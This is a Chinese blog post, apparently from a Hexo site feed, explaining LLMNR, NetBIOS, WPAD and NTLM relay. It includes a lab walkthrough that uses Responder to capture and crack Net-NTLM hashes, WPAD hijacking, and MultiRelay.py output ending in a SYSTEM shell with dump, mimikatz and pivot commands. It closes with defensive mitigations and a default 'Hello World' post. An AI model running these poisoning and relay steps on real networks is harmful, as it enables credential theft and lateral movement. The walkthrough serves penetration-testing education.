alt="image-20210803080036544" style="zoom:67%;" /><blockquote><p><strong>域环境Server会将认证信息使用netlogon协议发送给域控制器，由域控制器完成检验并返回认证结果</strong></p></blockquote><h2 id="0x03-域名解析协议"><a class="markdownIt-Anchor" href="#0x03-域名解析协议"></a> 0x03 域名解析协议</h2><h3 id="llmnr"><a class="markdownIt-Anchor" href="#llmnr"></a> LLMNR</h3><p>从 <strong>Windows Vista</strong> 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。<strong>链路本地多播名称解析</strong>（LLMNR）是一个基于协议的域名系统（DNS）数据包的格式，使得双方的IPv4和IPv6的主机来执行名称解 析为同一本地链路上的主机。当局域网中的DNS服务器不可用时， DNS客户端会使用LLMNR本地链路多播名称解析来解析本地网段上的 主机的名称，直到网络连接恢复正常为止。</p><h4 id="解析过程"><a class="markdownIt-Anchor" href="#解析过程"></a> 解析过程</h4><p>一个完整的正常的 LLMNR 名称解析过程如下图所示：</p><p><strong>注：假定主机 B 已加入了组播组中。</strong></p><p><img src="https://i.loli.net/2021/08/03/RsauDponXBP2wKY.png" alt="image-20210803081906640" /></p><hr /><h3 id="netbios"><a class="markdownIt-Anchor" href="#netbios"></a> NetBIOS</h3><p><img align = "right" src = "https://i.loli.net/2021/08/03/WEdHQcCwLOzDlNT.png" style="zoom: 80%;" >NetBIOS(Network Basic Input Output System)：网络基本输入输出 系统，它提供了OSI模型中的会话层服务，让在不同计算机上运行的 不同程序，可以在局</p><p>域网中，互相连线，以及分享数据。严格来说， NetBIOS是一种应用程序接口(API)，系统可以利用WINS服务、广播及 Lmhosts文件等多种模式将NetBIOS名解</p><p>析为相应IP地址，几乎所有的 局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的 标识名称，主要用于局域网内计算机的互访。NetBIOS名称是</p><p>一个长度为16个字符的字符串。MS网络中用到NetBIOS名称的地方有：计算机名，域名，工作组名。</p><p>查看当前机器注册的NetBIOS名称：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbtstat -n</span><br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/NK6JC9kLVOAqlxX.png" alt="image-20210803083305277"  /><p>查看当前的NetBIOS名称缓存区：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbtstat -c</span> <br></code></pre></td></tr></table></figure><p>查看 NetBIOS节点类型：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/2p4Sux9QjmvE3qh.png" alt="image-20210803083606700" /><p>采用H节点的WINS客户端，其NetBIOS名称解析的完整顺序为：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 检查要查询的计算机名称是不是自己的计算机名称。<br><span class="hljs-bullet">2.</span> 检查NetBIOS名称缓存区。<br><span class="hljs-bullet">3.</span> 向WINS服务器查询。<br><span class="hljs-bullet">4.</span> 发出广播消息。<br><span class="hljs-bullet">5.</span> 检查Lmhosts文件。<br><span class="hljs-bullet">6.</span> 检查hosts文件或向DNS服务器查询。<br></code></pre></td></tr></table></figure><blockquote><p>Lmhosts文件和hosts文件存放于 <code>%Systemroot%\System32\drivers\etc</code>目录下。</p></blockquote><h3 id="windows系统域名解析顺序"><a class="markdownIt-Anchor" href="#windows系统域名解析顺序"></a> Windows系统域名解析顺序</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 本地hosts文件（%Systemroot%\System32\drivers\etc\hosts）<br><span class="hljs-bullet">2.</span> DNS缓存/DNS服务器<br><span class="hljs-bullet">3.</span> 链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBNS）<br></code></pre></td></tr></table></figure><p><strong>也就是说，如果在缓存中没有找到名称，DNS名称服务器又请求失败时，Windows系统就会通过LLMNR和NetBIOS名称服务在本地进行名称解析。这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称。</strong></p><hr /><h2 id="0x04-wpad"><a class="markdownIt-Anchor" href="#0x04-wpad"></a> 0x04 WPAD</h2><p><strong>WPAD（Web Proxy Auto-Discovery Protocol）</strong> 是 Web 代理自动发现协议的简称，该协议的功能是可以使局域网中用户的浏览器可以自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网。WPAD 支持所有主流的浏览器，从 IE 5.0 开始就已经支持了代理服务器自动发现/切换的功能，不过苹果公司考虑到 WPAD 的安全风险，在包括 OSX 10.10 及之后版本的操作系统中的 Safari 浏览器将不再支持 PAC 文件的解析。</p><h3 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h3><p>当系统开启了代理自动发现功能后，用户使用浏览器上网时，浏览器就会在当前局域网中自动查找代理服务器，如果 找到了代理服务器，则会从代理服务器中下载一个名为 <strong>PAC（Proxy Auto-Config）</strong> 的配置文件。该文件中定义了用 户在访问一个 URL 时所应该使用的代理服务器。浏览器会下载并解析该文件，并将相应的代理服务器设置到用户的浏览器中。</p><p>WPAD可以在IE浏览器的 <strong>Internet 选项 — 连接 — 局域网设置 — 自动检测设置</strong> 中看到，系统默认是勾选此功能的。</p><h3 id="wpad劫持"><a class="markdownIt-Anchor" href="#wpad劫持"></a> WPAD劫持</h3><p>WPAD 通常用 DNS 来配置，客户端主机向 DNS 服务器发起了 WPAD＋X 的查询请求。如果客户端主机是处于域环境下时，发起的 WPAD+X 的查询请求为 “WPAD.当前域的域名”。DNS 服务器对 WPAD 主机的名称进行解析返回 WPAD 主机的 IP 地址，客户端主机通过 WPAD 主机的 IP 的 80 端口下载并解析 PAC 文件。</p><blockquote><p>若DNS服务器没有该记录，<strong>则会降为LLMNR+NetBIOS名称查询</strong></p></blockquote><img src="https://i.loli.net/2021/08/03/EFfw5xd7hsnWtoU.png" alt="image-20210803154531889" style="zoom:80%;" /><h2 id="0x05-ntlm中继"><a class="markdownIt-Anchor" href="#0x05-ntlm中继"></a> 0x05 NTLM中继</h2><p>NTLM 身份验证被封装在其他协议中，但是无论覆盖的协议是什么，消息都是相同的。这允许在其他协议中使用 NTLM 消息。例如，使用 HTTP 进行身份验证的客户端会在“ Authorization”标头中发送 NTLM 身份验证消息。攻击者可以从 HTTP 头中提取这些消息，并在其他协议中使用它们，比如 SMB。</p><blockquote><p>NTLM支持多种协议，例如SMB、HTTP(S)、LDAP、IMAP、SMTP、POP3和MSSQL。</p></blockquote><p>根据上文提到的工作组环境和域环境的网络认证过程，可实现NTLM中继，获取低权限主机的shell</p><p>中继到 SMB 是一种典型的攻击手法。这种攻击会中继到 SMB 允许攻击者在禁用 SMB 签名的主机上执行文件，如果被中继的用户在该主机上具有管理特权。利用Responder中Multi-relay模块，允许攻击者与共享进行交互，例如下载或上传文件，它将生成一个本地 TCP shell 进行连接。</p><h2 id="0x06-responder介绍"><a class="markdownIt-Anchor" href="#0x06-responder介绍"></a> 0x06 Responder介绍</h2><p>Responder是监听LLMNR和NetBIOS协议的工具之一，能够抓取网络中所有的LLMNR和NetBIOS请求并进行响应，获取最初的账户凭证。 Responder会利用内置SMB认证服务器、MSSQL认证服务器、HTTP 认证服务器、HTTPS认证服务器、LDAP认证服务器，DNS服务器、 WPAD代理服务器，以及FTP、POP3、IMAP、SMTP等服务器，收集目标网络中的明文凭据，还可以通过Multi-Relay功能在目标系统中执行命令。</p><p>Github地址:</p><blockquote><p><a href="https://github.com/SpiderLabs/Responder">SpiderLabs/Responder: Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. (github.com)</a></p></blockquote><p>kali中内置Responder</p><img align = "left" src = "https://i.loli.net/2021/08/03/tapnIxs28lKghY4.png" style="zoom:80%;" ><blockquote><p><strong>Responder原理本质在于受害机监听同域内中所有主机的广播请求，并且伪造应答(poisoning)，达到截取hash值的目的</strong>。</p></blockquote><hr /><h1 id="攻击演示"><a class="markdownIt-Anchor" href="#攻击演示"></a> 攻击演示</h1><p><strong>测试环境：</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">kali(被控主机) :  172.16.56.130<br><br>​windows <span class="hljs-number">7</span> : 172.16.56.11<br><br>​windows server <span class="hljs-number">2008</span> R2 (DC) : 172.16.56.10<br></code></pre></td></tr></table></figure><h2 id="利用llmnr和netbios截取net-ntlm-hash"><a class="markdownIt-Anchor" href="#利用llmnr和netbios截取net-ntlm-hash"></a> 利用LLMNR和NetBIOS截取Net-NTLM Hash</h2><blockquote><p>两台域内主机默认开启LLMNR和NetBIOS名称服务</p></blockquote><p>对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以 可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash。</p><p><strong>1. 开启监听</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -f<br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/U8a9ND6FxmdAkuI.png" alt="_20210803102000" style="zoom:80%;" /><p><strong>2. win7操作</strong></p><blockquote><p>在网络上连接一个无法解析的域名</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\whoami<br></code></pre></td></tr></table></figure></blockquote><img align = "left" src="https://i.loli.net/2021/08/03/Gulv2Pp5fYkD1R3.png" alt="_20210803103047" /><p>截获的Hash值</p><img align = "left" src="https://i.loli.net/2021/08/03/8WlvOwYzhItKy1V.png" alt="_20210803103407" style="zoom:80%;" /><blockquote><p>Responder会将所有抓取到的数据存储到 /usr/share/responder/logs/ 文件夹下，会为每个service-proto-IP生成 唯一的文件。使用responder抓取的通常就是Net-NTLM Hash。攻击者无法使用Net-NTLM Hash进行哈希传递攻击，只能使用hashcat、John等工具爆破或进行 NTLM-Relay攻击。</p></blockquote><p><strong>3. 使用工具进行爆破</strong></p><img align = "left" src="https://i.loli.net/2021/08/03/Q1kIBTSErnuM3tb.png" alt="_20210803104656" style="zoom:80%;" /><p>得到明文密码010612和用户名John</p><h2 id="利用wpad劫持获得net-ntlm-hash"><a class="markdownIt-Anchor" href="#利用wpad劫持获得net-ntlm-hash"></a> 利用WPAD劫持获得Net-NTLM Hash</h2><blockquote><p>Responder可以创建一个假WPAD服务器，并响应客户端的WPAD名称解析。 然后客户端请求这个假WPAD 服务器的wpad.dat文件。</p></blockquote><p><strong>1. 创建WPAD服务器并开启监听</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -v -w -F<br></code></pre></td></tr></table></figure><p><strong>2. win7操作</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">开启WPAD代理后访问网页并登陆<br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/jzO4EcX3Jr9d5xB.png" alt="_20210803110048" style="zoom: 80%;" /><p>截取的Hash值</p><img align = "left" src="https://i.loli.net/2021/08/03/vlKJNuywSZckYVP.png" alt="_20210803110309" style="zoom:80%;" /><h2 id="smb-relay"><a class="markdownIt-Anchor" href="#smb-relay"></a> SMB Relay</h2><p>利用Responder/tools/MultiRelay.py可实现NTLM认证中继到SMB中去</p><p><strong>1. 修改Responder.conf文件关闭HTTP和SMB服务器</strong></p><img align = "left" src="https://i.loli.net/2021/08/03/1HmLPjrKpcZulXO.png" alt="截图_选择区域_20210803143821" style="zoom:80%;" /><p><strong>2. 查看域内SMB签名开启状况</strong></p><img align = "left" src="https://i.loli.net/2021/08/03/ECkNToiMGDLbFKP.png" alt="截图_选择区域_20210803143431" style="zoom:80%;" /><p><strong>2. 开启监听</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -v <br></code></pre></td></tr></table></figure><p><strong>3. 新建终端，运行MultiRelay.py脚本</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> MultiRelay.py -t <span class="hljs-number">172.16.56.11</span> -u <span class="hljs-literal">ALL</span><br></code></pre></td></tr></table></figure><p><strong>4. win sever 2008 操作</strong></p><blockquote><p>随便上传点SMB流量 😄</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\wuqian<br></code></pre></td></tr></table></figure></blockquote><p><strong>拿到win7的shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root💀kali)-[/usr/share/responder/tools]<br>└─# python3 MultiRelay.py -t 172.16.56.11 -u ALL<br><br>Responder MultiRelay 2.5 NTLMv1/2 Relay<br><br>Send bugs/hugs/comments to: laurent.gaffie@gmail.com<br>Usernames to relay (-u) are case sensitive.<br>To kill this script hit CTRL-C.<br><br>/*<br>Use this script in combination with Responder.py for best results.<br>Make sure to set SMB and HTTP to OFF in Responder.conf.<br><br>This tool listen on TCP port 80, 3128 and 445.<br>For optimal pwnage, launch Responder only with these 2 options:<br>-rv<br>Avoid running a command that will likely prompt for information like net use, etc.<br>If you do so, use taskkill (as system) to kill the process.<br>*/<br><br>Relaying credentials for these users:<br>[&#x27;ALL&#x27;]<br><br><br>Retrieving information for 172.16.56.11...<br>SMB signing: False<br>Os version: &#x27;Windows 7 Professional 7601 Service Pack 1&#x27;<br>Hostname: &#x27;JOHN-PC&#x27;<br>Part of the &#x27;CORP&#x27; domain<br>[+] Setting up SMB relay with SMB challenge: 2a92d665043bd7d4<br>[+] Received NTLMv2 hash from: 172.16.56.10 <br>[+] Client info: [&#x27;eWindows Server 2008 HPC Edition 7601 Service Pack 1&#x27;, domain: &#x27;CORP&#x27;, signing:&#x27;False&#x27;]                                                                          <br>[+] Username: Administrator is whitelisted, forwarding credentials.<br>[+] SMB Session Auth sent.<br>[+] Looks good, Administrator has admin rights on C$.<br>[+] Authenticated.<br>[+] Dropping into Responder&#x27;s interactive shell, type &quot;exit&quot; to terminate<br><br>Available commands:<br>dump               -&gt; Extract the SAM database and print hashes.<br>regdump KEY        -&gt; Dump an HKLM registry key (eg: regdump SYSTEM)<br>read Path_To_File  -&gt; Read a file (eg: read /windows/win.ini)<br>get  Path_To_File  -&gt; Download a file (eg: get users/administrator/desktop/password.txt)<br>delete Path_To_File-&gt; Delete a file (eg: delete /windows/temp/executable.exe)<br>upload Path_To_File-&gt; Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \windows\temp\<br>runas  Command     -&gt; Run a command as the currently logged in user. (eg: runas whoami)<br>scan /24           -&gt; Scan (Using SMB) this /24 or /16 to find hosts to pivot to<br>pivot  IP address  -&gt; Connect to another host (eg: pivot 10.0.0.12)<br>mimi  command      -&gt; Run a remote Mimikatz 64 bits command (eg: mimi coffee)<br>mimi32  command    -&gt; Run a remote Mimikatz 32 bits command (eg: mimi coffee)<br>lcmd  command      -&gt; Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)<br>help               -&gt; Print this message.<br>exit               -&gt; Exit this shell and return in relay mode.<br>                      If you want to quit type exit and then use CTRL-C<br><br>Any other command than that will be run as SYSTEM on the target.<br><br>Connected to 172.16.56.11 as LocalSystem.<br>C:\Windows\system32\:#<br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/i2Tfg17PoLZIbSX.png" alt="截图_选择区域_20210803144439" style="zoom:80%;" /><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>windows的NTLM认证在多种协议例如HTTP,SMB,WPAD,MSSQL中得到广泛应用，但该认证安全性不能得到保证，可通过中间人攻击获取Hash或者中继达到域内横向渗透。如何防范是我们关心的问题</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.关闭LLMNR以及NetBIOS服务<br><span class="hljs-number">2</span>.关闭WPAD代理服务器<br><span class="hljs-number">3</span>.将域内主机<span class="hljs-built_in">ip</span>添加到本地hosts文件中<br><span class="hljs-number">4</span>.添加SMB签名<br></code></pre></td></tr></table></figure><h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> <strong>Reference</strong></h2><blockquote><p><a href="https://cloud.tencent.com/developer/news/476984">NTLM 中继攻击的几种非主流玩法 </a></p><p><a href="http://www.vuln.cn/6761">利用 LLMNR 名称解析缺陷劫持内网指定主机会话 – Her0in | 漏洞人生 (vuln.cn)</a></p><p><a href="http://www.vuln.cn/6762">利用 NetBIOS 协议名称解析及 WPAD 进行内网渗透 – Her0in | 漏洞人生 (vuln.cn)</a></p><p><a href="https://www.jianshu.com/p/9627962db4da">SMB relay攻击复现 - 简书 (jianshu.com)</a></p><p><a href="https://www.redhatzone.com/ask/article/1459.html">浅析SMB relay攻击手法_红帽社区 (redhatzone.com)</a></p><p><a href="https://www.freebuf.com/articles/network/244375.html">内网渗透测试：NTLM Relay攻击分析 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.jianshu.com/p/1b545a8b8b1e">内网渗透之Responder与Net-NTML hash - 简书 (jianshu.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/06/01/hello-world/"/>
    <url>/2022/06/01/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
